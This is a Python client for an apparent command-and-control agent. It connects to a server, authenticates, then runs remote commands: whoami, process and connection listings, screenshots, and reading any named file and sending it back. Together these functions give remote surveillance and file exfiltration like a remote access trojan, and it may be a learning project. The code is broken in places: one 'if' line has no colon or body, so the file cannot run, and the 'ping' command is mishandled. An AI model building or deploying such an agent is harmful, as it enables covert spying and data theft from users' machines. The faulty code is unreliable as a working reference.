import socket
import json
import subprocess
import os
import psutil
import pyautogui
import io
import time
from protocol import recv_message,create_result,send_message

ip_server = '127.0.0.1' 
port_server = 22

def get_process_list():
    procs_str = f"{'PID':<10} {'Name':<30}\n"
    procs_str += "-" * 40 + "\n"
    
    count = 0
    for proc in psutil.process_iter(['pid', 'name']):
        if count >= 10: 
            break
        try:
            p_info = proc.info
            procs_str += f"{p_info['pid']:<10} {p_info['name']:<30}\n"
            count += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
            
    return procs_str.encode()
def get_screenshot_bytes():
    try:
        buffer = io.BytesIO()
        pyautogui.screenshot().save(buffer, format='PNG')
        return buffer.getvalue()
    except Exception as e:
        return f"Error taking screenshot: {e}".encode()

def get_whoami():

    try:
        output = subprocess.check_output("whoami", shell=True, stderr=subprocess.STDOUT)
            
        return output
            
    except Exception as e:
        return str(e).encode()
    
def get_file(file_path):
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                return f.read() 
        else:
            return f"Error: File '{file_path}' not found.".encode()
    except Exception as e:
        return f"Error reading file: {e}".encode()
def get_network_connections():
    conn_str = f"{'Proto':<7} {'Local Address':<35} {'Remote Address':<35} {'Status':<15}\n"
    conn_str += "-" * 90 + "\n"
    
    try:
        connections = psutil.net_connections(kind='inet')
        
        for conn in connections[:15]: 
            proto = "TCP" if conn.type == socket.SOCK_STREAM else "UDP"
            
            l_addr = f"{conn.laddr.ip}:{conn.laddr.port}"
            
            if conn.raddr:
                r_addr = f"{conn.raddr.ip}:{conn.raddr.port}"
            else:
                r_addr = "N/A"
            
            conn_str += f"{proto:<7} {l_addr:<25} {r_addr:<25} {conn.status:<15}\n"
            
    except Exception as e:
        conn_str += f"Error: {e}\n"
        
    return conn_str.encode()
def handler_command(packet):
    task_id = packet.get("task_id")
    command_name = packet.get("command")
    args = packet.get("args", {})
    status = 200
    if command_name=="ping":
        result = "success"
    if command_name == 'whoami':
        result = get_whoami()
    elif command_name == 'tasklist':
        result = get_process_list()
    elif command_name == 'netstat':
        result = get_network_connections()
    elif command_name == 'getfile':
        file_path = args.get("path")
        if file_path:
            result = get_file(file_path)
        else:
            result = b"Error: No file path provided."
    elif command_name == 'screenshot':
        result = get_screenshot_bytes()
    else:
        result = b"unknown command"
        status = 400
        
    response_packet = create_result(task_id,command_name,status,result)
    return response_packet

if __name__ == "__main__":
    sock_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock_server.connect((ip_server, port_server))
        msg = recv_message(sock_server)
        print(f"Server says: {msg}")#Login or Create format
        choice = input("Your choice (Login/Create): ")
        
        name = input("Enter Name: ")
        password = input("Enter Password: ")
        payload = {"action":choice,"data":{"name":name,"password":password}}
        payload = json.dumps(payload)
        payload_bytes = payload.encode()
        header = f"{len(payload_bytes):<10}".encode()
        sock_server.send(header+payload_bytes)


        final_answer = recv_message(sock_server)  
        print(f"Final Status: {final_answer.get('status')}")
        agent_id = final_answer.get("agent_id")

        if final_answer.get("status").lower() == "success":   #after auth
            while True:

                command_server = recv_message(sock_server)#recv command from server
                print(command_server)
                if command_server
                response_packet  = handler_command(command_server)
                send_message(sock_server, response_packet)  


       
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        sock_server.close()